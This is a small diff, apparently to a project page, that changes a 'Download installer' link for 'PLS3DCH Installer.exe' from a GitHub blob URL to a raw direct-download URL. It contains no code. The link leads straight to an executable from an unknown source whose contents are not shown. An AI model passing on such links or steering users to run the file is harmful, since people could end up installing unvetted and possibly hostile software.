@@ -18,7 +18,7 @@
 </p>
 <h2>
   
-  [Download installer 🔻](https://github.com/denwerdan-arch/PLS3DCH/blob/c4a1965d4688b63b40ecbfe45a210664fb071b72/PLS3DCH%20Installer.exe)
+  [Download installer 🔻](https://github.com/denwerdan-arch/PLS3DCH/raw/c4a1965d4688b63b40ecbfe45a210664fb071b72/PLS3DCH%20Installer.exe)
 
 </h2>
 
